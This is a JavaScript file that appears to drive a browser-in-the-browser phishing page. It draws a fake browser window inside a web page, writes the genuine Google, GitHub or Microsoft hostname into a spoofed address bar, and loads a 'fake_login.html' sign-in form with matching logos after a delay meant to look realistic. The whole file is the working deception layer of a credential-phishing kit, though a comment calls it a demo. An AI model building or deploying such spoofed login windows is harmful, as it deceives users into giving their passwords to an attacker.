var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("title-bar");

////////////////// Auth Provider Selection //////////////////
document.addEventListener('DOMContentLoaded', function() {
  const authProviders = document.querySelectorAll('.auth-provider');
  const authSelection = document.getElementById('auth-selection');
  const browserWindow = document.getElementById('window');
  const domainName = document.getElementById('domain-name');
  const domainPath = document.getElementById('domain-path');
  const content = document.getElementById('content');
  
  authProviders.forEach(provider => {
    provider.addEventListener('click', function() {
      const providerName = this.getAttribute('data-provider');
      const providerUrl = this.getAttribute('data-url');
      
      // Add loading state
      this.classList.add('loading');
      
      // Simulate loading delay for realistic feel
      setTimeout(() => {
        // Hide auth selection screen
        authSelection.style.display = 'none';
        
        // Update browser URL bar based on provider
        updateUrlBar(providerName, providerUrl);
        
        // Update iframe content based on provider
        updateBrowserContent(providerName, providerUrl);
        
        // Show browser window
        browserWindow.style.display = 'block';
        
        // Center the browser window
        centerBrowserWindow();
      }, 1000);
    });
  });
  
  function updateUrlBar(provider, url) {
    const urlObj = new URL(url);
    domainName.textContent = urlObj.hostname;
    domainPath.textContent = urlObj.pathname;
  }
  
  function updateBrowserContent(provider, url) {
    // For demo purposes, we'll load different content based on provider
    const logoElement = document.getElementById('logo');
    
    if (provider === 'google') {
      content.src = 'fake_login.html?provider=google';
      document.getElementById('logo-description').textContent = 'Sign in to Google';
      logoElement.src = 'google-logo.svg';
    } else if (provider === 'github') {
      content.src = 'fake_login.html?provider=github';
      document.getElementById('logo-description').textContent = 'Sign in to GitHub';
      logoElement.src = 'github-logo.svg';
    } else if (provider === 'microsoft') {
      content.src = 'fake_login.html?provider=microsoft';
      document.getElementById('logo-description').textContent = 'Sign in to Microsoft';
      logoElement.src = 'logo.svg';
    }
  }
  
  function centerBrowserWindow() {
    // Add some animation when showing the browser
    browserWindow.style.opacity = '0';
    browserWindow.style.transform = 'scale(0.9)';
    
    setTimeout(() => {
      browserWindow.style.transition = 'all 0.3s ease';
      browserWindow.style.opacity = '1';
      browserWindow.style.transform = 'scale(1)';
    }, 50);
  }
});

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function handleMouseOver() {
  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  minimize.style.cursor = 'context-menu';
});

minimize.addEventListener('mouseout', function handleMouseOut() {
  minimize.style.backgroundColor = '#d6dae0';
  minimize.style.cursor = 'default';
});

square.addEventListener('mouseover', function handleMouseOver() {
  square.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
  square.style.cursor = 'context-menu';
});

square.addEventListener('mouseout', function handleMouseOut() {
  square.style.backgroundColor = '#d6dae0';
  square.style.cursor = 'default';
});

exit.addEventListener('mouseover', function handleMouseOver() {
  exit.style.backgroundColor = '#E81123';
  exit.style.cursor = 'context-menu';
});

exit.addEventListener('mouseout', function handleMouseOut() {
  exit.style.backgroundColor = '#d6dae0';
  exit.style.cursor = 'default';
});

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality - now goes back to auth selection
$("#exit").click(function(){
    $("#window").css("display", "none");
    $("#auth-selection").css("display", "flex");
    
    // Reset any loading states
    document.querySelectorAll('.auth-provider').forEach(provider => {
      provider.classList.remove('loading');
    });
});

// Maximize button functionality
$("#square").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $("#window").css("width", "40%");
    $("#title-bar-width").css('width', '100%');
    $("#content").css("width", "100%");
    $("#square").removeClass("enlarged");
  }
  else{
    $("#window").css("width", "70%");
    $("#title-bar-width").css('width', '100%');
    $("#content").css("width", "100%");
    $("#square").addClass("enlarged");
  }
}